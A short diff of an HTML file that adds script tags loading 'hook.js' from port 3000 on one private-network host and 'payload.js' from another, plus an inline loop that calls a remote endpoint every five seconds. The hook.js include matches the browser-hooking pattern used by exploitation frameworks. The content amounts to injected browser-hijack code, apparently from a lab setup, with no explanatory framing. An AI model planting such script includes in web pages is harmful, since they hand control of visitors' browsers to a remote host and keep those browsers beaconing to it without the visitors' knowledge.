@@ -1,3 +1,13 @@
-<script src="http://10.0.0.83:3000/hook.js"></script> 
+<script src="http://10.0.0.83:3000/hook.js"></script>
+<script src="http://192.168.137.131/payload.js"></script>
 
-<script src="http://192.168.137.131/index.html></script> 
+
+<script>
+(function loop() {
+    // Your payload code here
+    fetch('http://192.168.137.131/your-endpoint')
+      .then(() => console.log("Payload sent"));
+
+    setTimeout(loop, 5000); // Repeat every 5 seconds
+})();
+</script>
